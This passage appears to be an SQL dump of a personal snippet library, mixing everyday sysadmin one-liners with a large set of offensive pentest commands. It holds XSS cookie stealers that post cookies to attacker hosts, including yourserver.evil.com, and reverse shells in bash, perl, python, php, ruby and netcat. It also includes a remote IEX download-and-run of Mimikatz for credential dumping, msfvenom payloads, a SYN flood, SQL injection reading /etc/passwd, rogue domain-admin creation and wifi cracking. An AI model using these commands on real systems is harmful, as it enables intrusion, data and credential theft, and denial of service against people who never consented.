                    Negative values right-justify\nsqlite>\n'),(734,'2017-06-09 08:20:23','xss prendere intera pagina','encodeURIComponent(document.body.innerHTML)\n'),(735,'2017-06-09 08:20:23','cookie stealer POST php','<?php\n    $response = $_POST[\'cookie\'];\n    $file = fopen(\"cookie.txt\", \"w\") or die(\"Unable to open file!\");\n    $txt = $response;\n    fwrite($file, $txt);\n    fclose($file);\n?>\n'),(736,'2017-06-09 08:20:23','javascript XSS payload doppia XHR per il furto di pagina e cookie','var request = new XMLHttpRequest();\nvar request2 = new XMLHttpRequest();\nrequest2.open(\'GET\', \'http://localhost:8000/vac/14f03495-e234-4525-90d4-b7dfa29835ac\">14f03495-e234-4525-90d4-b7dfa29835ac\', false);\nrequest2.send();\nvar response2 = request2.responseText;\nvar params = \"cookie=\"+encodeURIComponent(response2);\nrequest.open(\"POST\", \"http://10.10.12.114/cookie.php\", true);\nrequest.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\nrequest.send(params);\n'),(737,'2017-06-09 08:20:23','bash reverse shell simply easy facile corta','bash -i >& /dev/tcp/10.10.12.30/4444 0>&1\n'),(738,'2017-06-09 08:20:23','python ip decimal IP DECIMAL','import struct,socket; print struct.unpack(\"!I\", socket.inet_aton(\"10.10.12.144\"))[0]\n'),(739,'2017-06-09 08:20:23','crack ssh id_rsa key','pd chiave -d /pentest/PasswordList/rockyou.txt -K 7265FC656C429769E4C1EEFC618E660C\n'),(741,'2017-06-10 16:42:45','PHP errore 404','<?php\nhttp_response_code(404);\ninclude(\'my_404.php\'); // provide your own HTML for the error page\ndie();'),(748,'2017-06-14 12:36:10','Linux watch if a data is writed on USB cache','watch grep -e Dirty: -e Writeback: /proc/meminfo'),(749,'2017-06-14 17:45:08','apache .htaccess force to https','RewriteEngine On\r\nRewriteCond %{HTTPS} off\r\nRewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]\r\n'),(750,'2017-06-15 21:20:22','javascript read local file','<input type=\'file\' accept=\'text/plain\' onchange=\'openFile(event)\'><br>\r\n<img id=\'output\'>\r\n<script>\r\n  var openFile = function(event) {\r\n    var input = event.target;\r\n\r\n    var reader = new FileReader();\r\n    reader.onload = function(){\r\n      var text = reader.result;\r\n      console.log(reader.result.substring(0, 200));\r\n    };\r\n    reader.readAsText(input.files[0]);\r\n  };\r\n</script>'),(751,'2017-06-16 16:19:29','xss javascript cookie stealer img','document.write(\'<img src=\"https://yourserver.evil.com/collect.gif?cookie=\' + document.cookie + \'\" />\')'),(752,'2017-06-16 20:58:07','Binary exploitation ret2libc find functions and /bin/sh','readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit\r\n\r\nreadelf -s /lib/i386-linux-gnu/libc.so.6 | grep system\r\n\r\nstrings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep \'/bin/sh\''),(755,'2017-06-23 12:00:07','curl send data o file','curl -d@/etc/passd http://127.0.0.1'),(756,'2017-06-23 22:50:39','reverse shell bash alternative','mknod /var/tmp/fgp p ; /bin/sh 0</var/tmp/fgp |nc 10.10.13.185 6666 1>/var/tmp/fgp'),(757,'2017-06-24 17:30:06',' Calculations using AWK. AWK is a huge language, not just for printing columns\n','awk \'{print \"Avg for\",$1,\"is\",($2+$3+$4)/3}\' grades.txt '),(758,'2017-06-24 17:30:06',' Print first and last lines of a file\n','awk \'NR==1;END{print}\' file.txt '),(759,'2017-06-24 17:30:06',' Split the file on ; instead of space\n','awk -F \";\" \'{print $2}\' file.txt '),(760,'2017-06-24 17:30:06',' Print a portion of the text\n','awk \'/start_pattern/,/stop_pattern/\' file.txt '),(761,'2017-06-24 17:30:06',' show mode of as500\n','show system mode '),(762,'2017-06-24 17:30:06',' add vlan to your interface\n','interface GigabitEthernet7; switchport trunk allowed vlan add 2 '),(763,'2017-06-24 17:30:12',' diff file in cvs\n','cvs diff <file> '),(764,'2017-06-24 17:30:18',' show history of files\n','cvs log <file> '),(765,'2017-06-24 17:30:18',' roll back cvs change\n','file=cvs.txt; cvs update -r $(cvs log $file | grep ^revision | sed -n 2p | awk \'{print $NF}\') $file && mv $file{,.old} && cvs update -A $file && mv $file.old $file && cvs commit -m \"Reverted to previous version\" $file '),(766,'2017-06-24 17:30:18',' find broken symlinks\n','find -L . -type l '),(767,'2017-06-24 17:30:18',' List services started on boot\n','chkconfig --list '),(768,'2017-06-24 17:30:19',' Hijack screen\n','screen -D -R [ID] '),(769,'2017-06-24 17:30:19',' Forward the remote port to the local machine\n','ssh -R [lport]:[rip]:[rport] [ip] -N '),(770,'2017-06-24 17:30:21',' Forward the local port to the remote machine\n','ssh -L [lport]:[rip]:[rport] [ip] -N '),(771,'2017-06-24 17:30:26',' 1Gig of zeros\n','dd if=/dev/zero of=1g.img count=1M bs=1K '),(772,'2017-06-24 17:30:26',' get password policy for root\n','chage -l root '),(773,'2017-06-24 17:30:26',' Display system clock in terminal top right corner! :-)\n','while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done & '),(774,'2017-06-24 17:30:26',' display disk info\n','smartctl -d megaraid,0 -x /dev/sda '),(775,'2017-06-24 17:30:26',' icmp ping\n','hping3 -1 [ip] '),(776,'2017-06-24 17:30:26',' syn scan port range with hping\n','hping3 -8 [port]-[port] -S [ip] -V '),(777,'2017-06-24 17:30:31',' ACK scan on port\n','hping3 -A [ip] -p [port] '),(778,'2017-06-24 17:30:32',' udp port scan\n','hping3 -2 [ip] -p [port ] '),(779,'2017-06-24 17:30:33',' Get initial sequence number\n','hping3 -Q [ip] -p [port] -s '),(780,'2017-06-24 17:30:33',' get remote timestamp\n','hping3 -S [ip] -p [port] --tcp-timestamp '),(781,'2017-06-24 17:30:33',' Xmas\' scan\n','hping3 -F -p -U [ip] -p [port] '),(782,'2017-06-24 17:30:33',' Sweep range for up hosts ie 192.168.1.x\n','hping3 -1 [ip].x --rand-dest -I em1 '),(783,'2017-06-24 17:30:38',' Intercept all http\n','hping3 -9 HTTP -I em1 '),(784,'2017-06-24 17:30:38',' Syn flood victim\n','hping3 -S [victim] -a [gw] -p [port] --flood '),(785,'2017-06-24 17:30:38',' hp switch show if info\n','display interface brief '),(786,'2017-06-24 17:30:38',' get google\n','GET //google.com '),(787,'2017-06-24 17:30:39',' Brute HTTP with hydra -s 443 for ssl\n','hydra -L [usernames] -P [passwords] -t 1 -e ns -f -vV <destination> http-get / '),(788,'2017-06-24 17:30:39',' bash if\n','if [ $carprice -gt 20000]; then echo \"too much\"; else echo \"ok\"; fi '),(789,'2017-06-24 17:30:45',' Grab the cookie\n','<script>i = new XMLHttpRequest(); i.open(\'GET\', \'[dest]\' + document.cookie, true); i.send();</script> '),(790,'2017-06-24 17:30:45',' executes a command on the remote machine (i.e. opens up a command shell)\n','meterpreter> execute -f cmd.exe -i -H '),(791,'2017-06-24 17:30:45',' Quick scan to set us off\n','nmap -sS -P0 -T4 -n -iL info/ips.txt -oA nmap/quick-scan '),(792,'2017-06-24 17:30:45',' Quick scan of all the hosts (ignore pinging)\n','nmap -sS -P0 -T4 -Pn -n -iL info/ips.txt -oA nmap/quick-scan '),(793,'2017-06-24 17:30:45',' Source port spoofing\n','nmap -sS -P0 -T4 -p0-65535 -n -g 80 -iL info/ips.txt -oA nmap/source-port '),(794,'2017-06-24 17:30:45',' All port scan : assume up\n','nmap -sS -sU -T4 -Pn -p0-65535 -n -iL info/ips.txt -oA nmap/all-ports '),(795,'2017-06-24 17:30:45',' OS Detection\n','nmap -sS -P0 -T4 -n -A -iL info/ips.txt -oA nmap/os-discovery '),(796,'2017-06-24 17:30:51',' Find sql servers\n','nmap -sS -P0 -T5 -n -p 1433 -iL info/ips.txt -oA nmap/internal-sqls '),(797,'2017-06-24 17:30:51',' # Verify the certificate / private key association\n','openssl x509 -noout -modulus -in [CERT] | openssl md5 '),(798,'2017-06-24 17:30:52',' https://www.sslshopper.com/article-most-common-openssl-commands.html\n','openssl x509 -in certificate.crt -text '),(799,'2017-06-24 17:30:52',' Grab the hostname in the certificate\n','echo \"\" | openssl s_client -connect [ip]:443 2>/dev/null| grep ^subject | sed \'s/^.*CN=//\' '),(800,'2017-06-24 17:30:52',' Change MAC address\n','ifconfig eth0 hw ether 00:E0:81:5C:B4:0F '),(801,'2017-06-24 17:30:52',' How will the sytem route traffic to [IP]\n','ip route show to match [IP] '),(802,'2017-06-24 17:30:52',' Depricated way of showing routing table, please see the ip command\n','route -n '),(803,'2017-06-24 17:30:52',' Skipfish scanner\n','skipfish -O -MEU -o results-nonauth -W ~/pentest/wordlists/skipfish.wl -k 00:30:00 https://[ip] '),(804,'2017-06-24 17:30:52',' Curl through a proxy (-m = timeout)\n','curl -D - --proxy1.0 [ip]:80 -m 2 [url] '),(805,'2017-06-24 17:30:52',' Curl with cookie\n','curl -k --cookie \"[cookie]\" [url] --silent | grep \"<title>\" '),(806,'2017-06-24 17:30:52',' Null session smb\n','smbclient -I [IP] -L [domain] -N -U \"\" '),(807,'2017-06-24 17:30:52',' Default community string in SNMP\n','snmpwalk -v 1 -c public [TARGET] '),(808,'2017-06-24 17:30:52',' Ettercap arp poisoning\n','ettercap -M arp -T -i em1 -L log /[TARGET]// '),(809,'2017-06-24 17:30:52',' Fierce (v0.9) - DNS bruteforcer\n','fierce -threads 10 -dns [domain] -wordlist [wordlist] -dnsserver 8.8.8.8 -file fierce.txt '),(810,'2017-06-24 17:30:53',' recover file after being deleted\n','lsof 2>/dev/null | grep deleted;  cat /proc/24702/fd/4 '),(811,'2017-06-24 17:30:53',' list installed programs\n','rpm -qa | less '),(812,'2017-06-24 17:30:53',' remove 4 chars\n','echo \"hello fredrick\" | sed \'s/.\\{4\\}$//\' '),(813,'2017-06-24 17:30:53',' add space after each line\n','cat db.schema | sed G '),(814,'2017-06-24 17:30:53',' convert a list into a multi line CSV\n','sed \'s/ *$//;s/$/;/\' linkedin.txt | paste - - - - | tr -d \'\\t\' '),(815,'2017-06-24 17:30:54',' # Add to the beginning of the line starting with a pattern\n','sed -i \'/^[0-9]/ s/^/sshd: /\' /etc/hosts.allow '),(816,'2017-06-24 17:30:54',' bash reverse shell\n','bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 '),(817,'2017-06-24 17:30:55',' perl reverse shell\n','perl -e \'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\' '),(818,'2017-06-24 17:30:55',' python reverse shell\n','python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\' '),(819,'2017-06-24 17:30:55',' php reverse shell : php from the CLI\n','php -r \'$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");\' '),(820,'2017-06-24 17:30:55',' ruby reverse shell\n','ruby -rsocket -e\'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)\' '),(821,'2017-06-24 17:30:55',' net cat reverse shell\n','nc -e /bin/sh 10.0.0.1 1234 '),(822,'2017-06-24 17:30:55',' Load a file with MYSQL\n','null union all select load_file(\'/etc/passwd\')/* '),(823,'2017-06-24 17:30:55',' enable xp_cmdshell\n','exec sp_configure \'xp_cmdshell\', 1 go reconfigure '),(824,'2017-06-24 17:30:56',' oracle add user\n','create user victor identified by pass123 temporary tablespace temp default tablespace users;grant connect to victor;grant resource to victor; '),(825,'2017-06-24 17:30:56',' mysql add user\n','insert into mysql.user (user, host, password) values (\'victor\', \'localhost\', password(\'pass123\')) '),(826,'2017-06-24 17:30:56',' mssql add user\n','exec sp_addlogin \'victor\', \'pass123\';  exec sp_addsrvrolemember \'victor\', \'sysadmin\' '),(827,'2017-06-24 17:30:56',' Fix nano <3 ;)\n','# rm -rf `which nano`; ln -s `which vim` /usr/bin/nano '),(828,'2017-06-24 17:31:01',' list windows services\n','net start '),(829,'2017-06-24 17:31:01',' list windows password requirements : add /domain for AD\n','net accounts '),(830,'2017-06-24 17:31:06',' password requirements domain\n','net accounts /domain '),(831,'2017-06-24 17:31:06',' try to reave WPS wifi\n','reaver -i mon0 -c <channel> -b <bssid> -vv '),(832,'2017-06-24 17:31:07',' .net xss filter evasion\n','<%div style=\"xss:expression(alert(123))\"> '),(833,'2017-06-24 17:31:07',' .net xss filter evasion\n','<IMG SRC=j&#X41vascript:alert(\'test2\')> '),(834,'2017-06-24 17:31:07',' UTF7 xss\n','%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi '),(835,'2017-06-24 17:31:08',' not ls\n','sl '),(836,'2017-06-24 17:31:08',' Abuse open x11 : Think open term add user add key ;)\n','command=\"[cmd]\";echo -n xdotool key \" \"; echo -n $command| sed  \'s# #€#g\' | sed -e \'s/\\(.\\)/\\1 /g\' | sed \'s#/#slash#g\' | sed \'s#@#at#g\'|  sed \'s#€#space#g\' | sed \'s#-#minus#g\'|sed \'s#>#greater#g\'| sed \'s#+#plus#g\' | sed \'s#\"#quotedbl#g\' | sed \'s#~#asciitilde#g\' | sed \'s#\\.#period#g\' | sed \'s#_#underscore#g\'; echo KP_Enter '),(837,'2017-06-24 17:31:08',' WIFI enable USB2 before USB3 : helps with passthrough\n','echo 1 > /sys/module/usbcore/parameters/old_scheme_first '),(838,'2017-06-24 17:31:08',' WIFI : Scan the range in an orderly manner\n','airodump-ng -f 4000  --cswitch 1 --band abg  wlan0mon --output-format csv -w WifiOverview '),(839,'2017-06-24 17:31:08',' WIFI : Enable monitor mode on interface\n','ifconfig wlan0 down; iwconfig wlan0 mode monitor; ifconfig wlan0 up; '),(840,'2017-06-24 17:31:08',' Yaps windows portscan, upload first duh\n','yaps.exe -start -start_address [victim] -stop_address [victim] -start_port [port] -stop_port [port] -timeout 5 -resolve n '),(841,'2017-06-24 17:31:08',' Burpify JSON request\n','cat json.txt | sed \"s/false/§false§/g\" | sed \"s/true/§true§/g\" | sed \"s/null/§null§/g\" | sed \"s/:\\\"/:\\\"§/g\" | sed \"s/\\\",/§\\\",/g\" | sed \"s/\\\"}/§\\\"}/g\" | sed \"s/\\\\[\\\\]/\\\\[§§\\\\]/g\" '),(842,'2017-06-24 17:31:09',' mini xss\n','<script src=//[ip]> '),(843,'2017-06-24 17:31:09',' MSF Venom make dll\n','./msfvenom -p windows/meterpreter/reverse_https -f dll -e x86/shikata_ga_nai -i 30 LHOST=[IP] LPORT=443 > /data/Clients/[FILE] '),(844,'2017-06-24 17:31:09',' Windows run as\n','runas /user:[DOM]\\[USER] [EXE] '),(845,'2017-06-24 17:31:09',' Priv esc check weak service perms, you may need an older version for older windows!\n','accesschk.exe -uwcqv \"Authenticated Users\" * '),(846,'2017-06-24 17:31:10',' powershell bypass block\n','Set-ExecutionPolicy unrestricted '),(847,'2017-06-24 17:31:10',' powershell bypass block\n','powershell.exe -noprofile -executionpolicy bypass '),(848,'2017-06-24 17:31:10',' loop to find user shares\n','for host in $(cat ../nmap/[IP File]); do echo \"Trying $host\"; smbclient -L $host -U  [DOM]/[USER]%\'[PASS]\'; done '),(849,'2017-06-24 17:31:12',' Invoke mimicatz, can use with psexec for pwnage\n','powershell \"IEX (New-Object Net.WebClient).DownloadString(\'http://bit.ly/1qMn59d\'); Invoke-Mimikatz -DumpCreds\" '),(850,'2017-06-24 17:31:12',' Dump a processes memory for offline abuse\n','procdump.exe -accepteula -ma keepass.exe keepass.dmp '),(851,'2017-06-24 17:31:12',' kill puppies, you monster (disable SElinux, though seriously just work around it)\n','setenforce permissive '),(852,'2017-06-24 17:31:12',' loop for who is where\n','for host in $(cat userhosts.txt); do echo $host; psexec.py [DOMAIN]/[user]:\'[pass]\'@$host \'WMIC ComputerSystem Get UserName\'; done | tee loggedin-dirty.txt;cat loggedin-dirty.txt | grep -v \"^\\[\" | grep -v \"^Impacket\" | grep -v \"^Trying\" | grep -v \"SMB SessionError\" | sed \'/^$/d\' '),(853,'2017-06-24 17:31:12',' Powershell password last changed, run on DC\n','Get-ADUser -filter * -properties * | sort-object passwordlastset | select-object samaccountname, passwordlastset, passwordneverexpires, homedirectory, mail, enabled | Export-csv -path c:\\temp\\pwprofile.csv '),(854,'2017-06-24 17:31:12',' dump dns zone on DC\n','dnscmd 127.0.0.1 /ZoneExport [FQDN] [OUT].zone '),(855,'2017-06-24 17:31:17',' Mount Sysvol share (hosted on the DC)\n','mount -t cifs \\\\\\\\[victim]\\\\SYSVOL -o username=[user],password=[password] mount/; nautilus mount/; '),(856,'2017-06-24 17:31:17',' Look in \'mount\' for share (mount sysvol first)\n','egrep -r \"cpassword|net\" mount '),(857,'2017-06-24 17:31:17',' loop to look for dual homed hosts\n','for host in $(cat ../nmap/IPs-SMB.txt); do echo $host; psexec.py [DOMAIN]/[user]:\'[pass]\'@$host \"ipconfig\"; done | grep \"IPv4 Address\\|Ethernet adapter\\|^[0-9]\" | sed \'/^$/d\' | tee dualhomed-search.txt '),(858,'2017-06-24 17:31:18',' loop to find local admins\n','for i in `cat smb_up `; do timeout 10 psexec.py [user]:[pass]@$i net localgroup administrators; done | tee local_admin_information '),(859,'2017-06-24 17:31:18',' turn loop for local admins into csv\n','egrep -v \"(\\*\\] T|\\[\\*\\] F|[\\*\\] C|[\\*\\] U|[\\*\\] S|[\\*\\] R)\" local_admin_information | egrep -v \"(\\[\\*\\] P|\\[\\*\\] R|\\[\\*\\] S|\\[\\*\\] O|\\[\\*\\] U)\" | grep -v \"Alias name\" | grep -v \"Administrators have complete\" | grep -v \\[\\!\\] | grep -v \\[-\\] | dos2unix | grep -v \"^$\" | sed s/\"\\[\\*\\] Creating service.*on\"/\'\'/g | grep -v Members | sed s/\\\\.\\\\.\\\\.\\\\.\\\\./\',\'/g | sed s/\"^ \"/\"€\"/g | sed s/\'The command completed successfully.\'/€/g | tr \"\\n\" \",\" | tr € \"\\n\" | grep -v \"^$\" | sort | uniq  > local_admins.csv '),(860,'2017-06-24 17:31:18',' connect to mssql\n','tsql -S [IP] -U sa -P\"[PASS]\" '),(861,'2017-06-24 17:31:18',' connect to mssql\n','/opt/impacket/examples/mssqlclient.py [user]:[pass]@[ip] -port [port] '),(862,'2017-06-24 17:31:18',' Recover IIS password\n','c:\\windows\\system32\\inetsrv\\appcmd.exe list apppool \"SharePoint Central Administration v4\" /text:ProcessModel.Password '),(863,'2017-06-24 17:31:18',' get domain trusts\n','netdom query trust '),(864,'2017-06-24 17:31:18',' show native port forwards windows\n','netsh interface portproxy show all '),(865,'2017-06-24 17:31:18',' set native port forward windows\n','netsh interface portproxy add v4tov4 protocol=tcp listenport=[lport] connectport=[rport] listenaddress=[lip] connectaddress=[rip] '),(866,'2017-06-24 17:31:18',' reset native port forward windows\n','netsh interface portproxy reset '),(867,'2017-06-24 17:31:19',' windows firewall status\n','sc query \"MpsSvc\" '),(868,'2017-06-24 17:31:19',' windows firewall status\n','netsh advfirewall firewall '),(869,'2017-06-24 17:31:19',' Windows process list\n','tasklist /v '),(870,'2017-06-24 17:31:19',' Windows force kill process\n','taskkill /f /im [PROCESS] '),(871,'2017-06-24 17:31:24',' Windows list listening ports\n','netstat -a | find \"LISTENING\" '),(872,'2017-06-24 17:31:24',' Windows open files\n','tasklist /FI \"IMAGENAME eq [process].exe\" /V '),(873,'2017-06-24 17:31:24',' ByPassUAC\n','bypassuac.exe /c [COMMAND] '),(874,'2017-06-24 17:31:24',' Scheduled cmd to run\n','at [TIME] command.exe /s cmd SYSCMD '),(875,'2017-06-24 17:31:24',' loop around and open cmd, Psexecy.py != psexec msf != sysinternals psexec\n','for host in $(cat hosts.txt); do psexec.py [DOM]/[USER]:\'[PASS]\'@$host \"cmd.exe\"; done '),(876,'2017-06-24 17:31:24',' PSExec with hashses\n','psexec.py -hashes [LM]:[NTLM] [DOM]/[USER]@[TARGET] \"cmd.exe\" '),(877,'2017-06-24 17:31:24',' RPCClient smb show users and groups\n','rpcclient -U \'[DOMAIN]\\[USER]\'%\'[PASS]\' \'[TARGET]\' -c enumdomusers,enumdomgroups '),(878,'2017-06-24 17:31:24',' Create Self-signed cert / key\n','name=sslfile;openssl genrsa -out $name.key 2048;openssl req -new -key $name.key -out $name.csr; openssl x509 -req -days 10 -in $name.csr -signkey $name.key -out $name.crt;openssl pkcs12 -export -clcerts -in $name.crt -inkey $name.key -out $name.p12;openssl pkcs12 -in $name.p12 -out $name.pem -clcerts '),(879,'2017-06-24 17:31:25',' Unquoted Service Paths\n','wmic service get name,displayname,pathname,startmode '),(880,'2017-06-24 17:31:25',' Unquoted Service Paths\n','sc query '),(881,'2017-06-24 17:31:25',' Unquoted Service Paths\n','sc qc \"[SERVICE]\" '),(882,'2017-06-24 17:31:26',' Unquoted Service Paths, start service\n','sc config \"[SERVICE]\" start= auto '),(883,'2017-06-24 17:31:26',' Unquoted Service Paths\n','sc config \"[SERVICE]\" start= disabled '),(884,'2017-06-24 17:31:31',' VBA launching command\n','Sub Test();Shell (\"powershell\");End Sub '),(885,'2017-06-24 17:31:31',' Javascript wget windows oneline : cscript /nologo wget.js http://[IP]\n','echo var WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");WinHttpReq.Open(\"GET\",WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();BinStream = new ActiveXObject(\"ADODB.Stream\");BinStream.Type=1;BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile(\"out.exe\");>wget.js '),(886,'2017-06-24 17:31:31',' Windows Wireless\n','netsh wlan show profile '),(887,'2017-06-24 17:31:32',' Windows Wireless\n','netsh wlan show profile name=\"[SSID]\" key=clear '),(888,'2017-06-24 17:31:32',' loop dump wifi keys\n','for host in $(cat localsubnet.txt); do echo \"Trying $host\"; winexe --user [Domain]/[user]%[pass] //$host \"netsh wlan export profile name=[PROFILE] key=clear\"; done '),(889,'2017-06-24 17:31:37',' proxy Metasploit pivot\n','run autoroute -s [CIDR SUBNET] '),(890,'2017-06-24 17:31:37',' proxy metasploit pivot\n','run autoroute -p '),(891,'2017-06-24 17:31:37',' proxy Metasploit pivot\n','background it then run... '),(892,'2017-06-24 17:31:37',' proxy Metasploit pivot\n','use auxiliary/server/socks4a '),(893,'2017-06-24 17:31:37',' proxy pivot\n','proxychains cmd '),(894,'2017-06-24 17:31:38',' Cat for windows\n','type [FILE] '),(895,'2017-06-24 17:31:38',' Domain Admins windows\n','net group \"Domain Admins\" /domain '),(896,'2017-06-24 17:31:38',' harvester\n','/data/hacking/theHarvester/theHarvester.py -h -d [domain] -l 1000 -b all | tee harvester-search-[DETAIL].txt '),(897,'2017-06-24 17:31:38',' harvester linkedin\n','/data/hacking/theHarvester/theHarvester.py -d [domain] -l 1000 -b linkedin | tee harvester-people-[DETAIL].txt '),(898,'2017-06-24 17:31:43',' KeePass2 Cracking\n','wine KeeCracker.exe -w /data/hacking/dictionaries/rockyou.dic -t 4 Database.kdbx '),(899,'2017-06-24 17:31:43',' Find files\n','find / -iname \'[SEARCH TERM]\' 2>/dev/null '),(900,'2017-06-24 17:31:43',' Single Nessus Module\n','/opt/nessus/bin/nessuscmd -U -O -p[port] -V -i [plugin ID] [target IP] '),(901,'2017-06-24 17:31:44',' \'Telnet\' s_client to SSL\n','openssl s_client -connect [domain]:443 '),(902,'2017-06-24 17:31:44',' IKE Agressive\n','ike-scan -A -v -id=test -f [input file] -P[PSK output file] '),(903,'2017-06-24 17:31:44',' IKE Agressive\n','psk-crack -d [word list e.g. rockyou.txt] [input key file] '),(904,'2017-06-24 17:31:44',' Windows ARP Cache\n','ipconfig /displaydns '),(905,'2017-06-24 17:31:44',' MSFConsole hints\n','use multi/handler '),(906,'2017-06-24 17:31:44',' MSFConsole hints\n','set PAYLOAD windows/meterpreter/reverse_https '),(907,'2017-06-24 17:31:44',' MSFConsole hints\n','set LHOST [IP] '),(908,'2017-06-24 17:31:44',' MSFConsole hints\n','set LPORT 443 '),(909,'2017-06-24 17:31:50',' MSFConsole hints\n','set ExitOnSession false '),(910,'2017-06-24 17:31:50',' MSFConsole hints\n','exploit -j '),(911,'2017-06-24 17:31:50',' Add a domain user from the CLI\n','net user [user] [pass] /add /domain '),(912,'2017-06-24 17:31:50',' Add [User] to the domain admins group\n','net group \"Domain Admins\" [user] /add /domain '),(913,'2017-06-24 17:31:50',' Add user to enterprise admins\n','net group \"Enterprise Admins\" [user] /add /domain '),(914,'2017-06-24 17:31:55',' Add user to the RDP group\n','net localgroup \"Remote Desktop Users\" [user] /add /domain '),(915,'2017-06-24 17:31:55',' Add a user to the local admin group, not as useful any more\n','net localgroup \"Administrators\" [user] /add /domain '),(916,'2017-06-24 17:31:55',' SQLmap generic command\n','/data/hacking/sqlmap/sqlmap.py --exclude-sysdbs --eta --is-dba  --current-user --current-db --hostname -o '),(917,'2017-06-24 17:31:55',' ARP Spoofing filter\n','etterfilter *.filter -o smb.ef '),(918,'2017-06-24 17:31:55',' ARP Spoofing gateway\n','ettercap -i em1 -L etter.log -T -M arp:remote /192.168.104.254/// //// '),(919,'2017-06-24 17:32:00',' ARP Spoofing everything\n','ettercap -i wlan0 -L etter.log -T -M arp:remote -L [CLIENT+TARGET].log /[GW IP]// /[TARGET IP]// '),(920,'2017-06-24 17:32:00',' ARP Spoofing DNS\n','ettercap -i [interface] -L etter.log -T -P dns_spoof -M arp:remote -L [CLIENT+TARGET].log /[GW IP]// /[TARGET IP]// '),(921,'2017-06-24 17:32:00',' Subnet calculator\n','ipcalc -b [CIDR Subnet] '),(922,'2017-06-24 17:32:00',' TCPDump (no DNS resolution)\n','tcpdump -n -i [interface] '),(923,'2017-06-24 17:32:00',' ARPing\n','arping -I em1 [TARGET IP] '),(924,'2017-06-24 17:32:01',' ARPing sweep network\n','for a in {0..254}; do arping -D -c 1 -I eth0 [NETWORK].$a; done | tee arping-[NET].txt '),(925,'2017-06-24 17:32:01',' Temporary IP\n','ifconfig eth0 192.168.0.x/24 '),(926,'2017-06-24 17:32:01',' Wireless survey WIFI\n','airmon-ng start wlan1 '),(927,'2017-06-24 17:32:06',' Wireless survey WIFI, useful if airmon start is broke\n','ifconfig wlan0 down; iwconfig wlan0 mode monitor; ifup wlan0 '),(928,'2017-06-24 17:32:06',' WIFI WPA handshake capture\n','airodump-ng -c [Channel #] --bssid [MAC Address] --showack -w [SSID] wlan1mon '),(929,'2017-06-24 17:32:06',' WIFI WPA handshake prep\n','wpaclean [OUTPUT] [INPUT] '),(930,'2017-06-24 17:32:06',' WIFI WPA handshake prep\n','aircrack-ng [INPUT.cap] -J [OUTPUT] '),(931,'2017-06-24 17:32:06',' wep cracking\n','airodump-ng -c 11 --bssid [VICTIM MAC] -w [OUTPUT] mon0 '),(932,'2017-06-24 17:32:06',' wep cracking\n','aireplay-ng -0 0 --ignore-negative-one -e [SSID] -a [AP MAC] -c [VICTIM MAC] mon0 '),(933,'2017-06-24 17:32:06',' wep cracking\n','aireplay-ng -1 0 -e [VICTIM SSID] -a [VICTIM MAC] -h 00:c0:ca:72:50:0b mon0 '),(934,'2017-06-24 17:32:06',' wep cracking\n','aireplay-ng -3 -b [VICTIM MAC] -h 00:c0:ca:72:50:0b mon0 '),(935,'2017-06-24 17:32:06',' wep cracking\n','aircrack-ng -b [VICTIM MAC] [OUTPUT]*cap '),(936,'2017-06-24 17:32:06',' Block outbound rule\n','iptables -I OUTPUT -d [DST IP] -j DROP '),(937,'2017-06-24 17:32:07',' Accept inbound port rule\n','iptables -I INPUT -p tcp --destination-port [PORT] -j ACCEPT '),(938,'2017-06-24 17:32:07',' medusa brute force\n','medusa -M ssh -U userlist -P passwordlist -h [host] '),(939,'2017-06-24 17:32:07',' Word list generator\n','./mp64.bin -o custom.dic -1 tT -2 eE3 -3 ?s ?1qq?2qqq?2?2qq?2?3?3 '),(940,'2017-06-24 17:32:07',' Word list generator\n','/data/hacking/hashcat-0.49/hashcat-cli64.bin -m 99999 wordseed.dic -r /data/hacking/hashcat-0.49/rules/leetspeak.rule --stdout | sort -u > custom.dic '),(941,'2017-06-24 17:32:07',' brute force ncrack vnc\n','ncrack -v -d1 -T5 -P /usr/share/wordlists/rockyou.txt [service eg vnc]://[target IP]:[port eg 5900] -oA [output file]-ncrack.txt '),(942,'2017-06-24 17:32:07',' DNS zone transfer\n','dig -t AXFR [FQDN] @[SERVER IP] '),(943,'2017-06-24 17:32:07',' NBTScan\n','nbtscan -v -s : 192.168.0.0/24 >> nbtscan-[SUBNET].txt '),(944,'2017-06-24 17:32:07',' NBTScan en masse\n','for a in {0..254}; do nbtscan -v -s : 192.168.$a.0/24 >> nbtscan-192.168.$a.txt; done '),(945,'2017-06-24 17:32:07',' network discovery RDNS\n','for a in {0..255}; do host -t ns $a.168.192.in-addr.arpa | grep -v \"name server\"; done >> networks.txt '),(946,'2017-06-24 17:32:13',' network discovery RDNS\n','cat networks-dirty.txt | grep \"^[0-9]\" | awk {\'print $1\'} | awk -F \".\" {\'print $3\".\"$2\".\"$1\".0/24\"\'} | sort -u > nets.txt '),(947,'2017-06-24 17:32:13',' network discovery RDNS\n','nmap -sS -n -v -T5 -iL networks-sorted.txt -oA nmapScan-ARP '),(948,'2017-06-24 17:32:13',' network discovery RDNS\n','cat nmapScan-ARP.gnmap | grep \"Status: Up\" | awk {\'print $2\'} | awk -F \".\" {\'print $1\".\"$2\".\"$3\".0/24\"\'} | sort -u > networks-withlivehosts.txt '),(949,'2017-06-24 